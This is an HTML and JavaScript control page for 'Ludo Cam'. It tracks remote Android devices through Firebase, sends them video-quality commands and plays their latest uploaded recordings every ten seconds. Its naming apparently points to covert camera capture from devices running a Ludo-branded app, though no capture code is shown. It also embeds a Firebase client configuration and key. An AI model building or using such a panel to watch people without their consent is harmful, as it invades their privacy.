<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludo Cam - Live</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 550px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            padding: 20px;
            background: #141414;
            border-radius: 24px;
            margin-bottom: 20px;
            border: 1px solid #222;
        }
        h1 { color: #fff; font-size: 28px; }
        h1 span { color: #00ff88; }
        .status-card {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            transition: all 0.2s;
        }
        .dot.red {
            background: #ff4444;
            box-shadow: 0 0 10px #ff4444;
        }
        .dot.green {
            background: #00ff88;
            box-shadow: 0 0 10px #00ff88;
        }
        .status-text {
            color: #fff;
            font-size: 16px;
            font-weight: 500;
        }
        .device-name {
            color: #00ff88;
            font-size: 13px;
            font-family: monospace;
        }
        .quality-bar {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .quality-select {
            background: #2a2a2a;
            border: 1px solid #444;
            color: #fff;
            padding: 8px 16px;
            border-radius: 24px;
            cursor: pointer;
        }
        .video-section {
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        .video-wrapper {
            position: relative;
            aspect-ratio: 16 / 9;
            background: #000;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
            cursor: pointer;
        }
        .play-overlay.hidden { display: none; }
        .play-btn {
            width: 70px;
            height: 70px;
            background: #00ff88;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 25px rgba(0,255,136,0.6);
        }
        .play-btn span { font-size: 35px; color: #000; margin-left: 5px; }
        .no-video {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #555;
            background: #0a0a0a;
        }
        .info-bar {
            padding: 12px 16px;
            background: #1a1a1a;
            border-radius: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #666;
        }
        .footer {
            text-align: center;
            color: #444;
            font-size: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 <span>LUDO</span> CAM</h1>
        </div>

        <!-- Status Card -->
        <div class="status-card">
            <div class="status-item">
                <div class="dot red" id="statusDot"></div>
                <span class="status-text" id="statusText">Offline</span>
            </div>
            <div class="device-name" id="deviceName">—</div>
        </div>

        <!-- Quality Bar -->
        <div class="quality-bar">
            <span>🎥 QUALITY</span>
            <select class="quality-select" id="qualitySelect">
                <option value="120p">120p</option>
                <option value="240p">240p</option>
                <option value="360p" selected>360p</option>
                <option value="480p">480p</option>
            </select>
        </div>

        <!-- Video Section -->
        <div class="video-section">
            <div class="video-wrapper">
                <video id="liveVideo" controls muted></video>
                <div class="play-overlay" id="playOverlay">
                    <div class="play-btn" id="playBtn"><span>▶</span></div>
                </div>
                <div class="no-video" id="noVideo">Waiting for stream...</div>
            </div>
        </div>

        <div class="info-bar">
            <span>📡 Auto-refresh: 10s</span>
            <span id="timestamp">—</span>
        </div>

        <div class="footer">
            🔒 Live Stream • Auto-refresh every 10 seconds
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBwDAhUS8iqNsM5rMewtwFnQs-s3FcnaoU",
            authDomain: "livecam-4e8b0.firebaseapp.com",
            databaseURL: "https://livecam-4e8b0-default-rtdb.firebaseio.com",
            projectId: "livecam-4e8b0",
            storageBucket: "livecam-4e8b0.firebasestorage.app",
            messagingSenderId: "315485454659",
            appId: "1:315485454659:android:e5d69c3b9a1a87854c2ff6"
        };

        const API_URL = "/api/photos";

        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const deviceNameSpan = document.getElementById('deviceName');
        const liveVideo = document.getElementById('liveVideo');
        const playOverlay = document.getElementById('playOverlay');
        const playBtn = document.getElementById('playBtn');
        const noVideo = document.getElementById('noVideo');
        const qualitySelect = document.getElementById('qualitySelect');
        const timestampSpan = document.getElementById('timestamp');

        let currentVideoUrl = null;
        let deviceId = null;

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // 🔥 ONLINE STATUS LISTENER (Real-time green/red dot)
        database.ref('ludo_cam/devices').on('value', (snapshot) => {
            const devices = snapshot.val();
            let isOnline = false;
            let onlineDeviceName = "";

            for (const [id, device] of Object.entries(devices || {})) {
                if (device.online === true) {
                    isOnline = true;
                    onlineDeviceName = device.deviceName;
                    deviceId = id;
                    break;
                }
            }

            if (isOnline) {
                statusDot.className = 'dot green';
                statusText.innerText = 'LIVE';
                deviceNameSpan.innerText = `📱 ${onlineDeviceName}`;
            } else {
                statusDot.className = 'dot red';
                statusText.innerText = 'Offline';
                deviceNameSpan.innerText = '—';
            }
        });

        // Quality command
        function sendQualityCommand(quality) {
            if (!deviceId) return;
            database.ref(`ludo_cam/commands/${deviceId}`).set({ quality: quality });
        }

        qualitySelect.addEventListener('change', (e) => {
            sendQualityCommand(e.target.value);
        });

        // Video player
        playBtn.addEventListener('click', () => {
            liveVideo.play().then(() => playOverlay.classList.add('hidden')).catch(e => console.log(e));
        });

        liveVideo.addEventListener('ended', () => playOverlay.classList.remove('hidden'));
        liveVideo.addEventListener('pause', () => {
            if (liveVideo.currentTime !== liveVideo.duration) playOverlay.classList.remove('hidden');
        });

        // Fetch videos
        async function refreshVideo() {
            try {
                const res = await fetch(API_URL);
                const data = await res.json();

                if (data.success && data.videos && data.videos.length > 0) {
                    const latestVideo = data.videos[0];
                    if (currentVideoUrl !== latestVideo.url) {
                        currentVideoUrl = latestVideo.url;
                        liveVideo.src = currentVideoUrl;
                        liveVideo.load();
                        noVideo.style.display = 'none';
                        liveVideo.style.display = 'block';
                        playOverlay.classList.remove('hidden');
                        timestampSpan.innerText = new Date(latestVideo.created_at).toLocaleTimeString();
                    } else {
                        liveVideo.style.display = 'block';
                        noVideo.style.display = 'none';
                    }
                } else {
                    liveVideo.style.display = 'none';
                    noVideo.style.display = 'flex';
                }
            } catch(e) {
                console.error(e);
            }
        }

        refreshVideo();
        setInterval(refreshVideo, 10000);
    </script>
</body>
</html>
